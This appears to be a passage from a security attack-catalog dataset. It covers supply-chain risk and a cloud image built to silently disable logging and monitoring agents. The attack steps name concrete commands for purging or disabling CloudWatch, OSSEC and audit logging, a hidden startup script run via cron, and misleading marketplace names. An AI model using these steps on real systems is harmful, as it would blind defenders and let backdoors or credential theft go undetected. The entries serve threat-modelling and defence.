Target Type: Developers, CI/CD runners, cloud build tools, base cloud images
Vulnerability: Installing unverified packages or unscanned base images
Impact: Secret leakage, cloud resource theft, lateral movement into cloud accounts
Detection Method: Use image scanners like Trivy/Grype, pip-audit, monitor DNS/HTTPS logs, compare image layers for unexpected files
Solution: Lock and pin all dependencies (requirements.txt, package-lock.json), use internal mirrors, block unknown egress, enforce image signing and only pull from trusted registries
Tags: Supply Chain, Dependency Attack, Third-Party Risk
Source: Cloud Security Labs, AWS Security Blog, MITRE ATT&CK

Title: Image with Disabled Cloud Logging / Monitoring
Attack Type: Evasion / Logging Bypass via Pre-configured Image
Scenario Description: Attacker creates a cloud VM image or container that disables or blocks all logging and monitoring tools by default. When the victim deploys this image (thinking it's safe or optimized), it appears to work fine — but key visibility tools (like audit logs, CloudWatch agent, OSSEC, or Falco) are silently disabled or removed. This allows attacker-planted backdoors, malware, or data theft to run undetected in the cloud.
Tools Used: Docker, AWS EC2 Image Builder, netstat, systemctl, cron, bash, cloud image marketplace (AWS/Azure), image scanners (Trivy, Falco), monitoring agents (CloudWatch agent, FluentBit, Datadog agent)
Attack Steps: Step 1: Attacker starts with a standard base image like ubuntu:20.04, and creates a new virtual machine (VM) or container from it using Docker or EC2 Image Builder. Step 2: In this image, attacker uninstalls or disables all major monitoring/logging agents. This includes commands like apt purge awslogs, systemctl disable cloudwatch-agent, or deleting /etc/ossec.conf. They may also block outbound syslog, audit logs, or even network telemetry by modifying /etc/rsyslog.conf, /etc/audit/auditd.conf, or iptables. Step 3: They insert a hidden malicious script (/opt/.background.sh) that runs on startup using cron (@reboot) or systemd. This script could establish a C2 connection, mine crypto, scan the network, or leak credentials — but now, there is no logging agent to detect it. Step 4: Attacker builds the image and uploads it to a cloud marketplace with a misleading but appealing name like ubuntu-secure-base, aws-hardened-base, or optimized-dev-linux. Step 5: A cloud user pulls the image and uses it to launch VMs, ECS containers, or Kubernetes pods. Everything seems normal — the system boots, applications run, but logging and monitoring are disabled or silently failing.
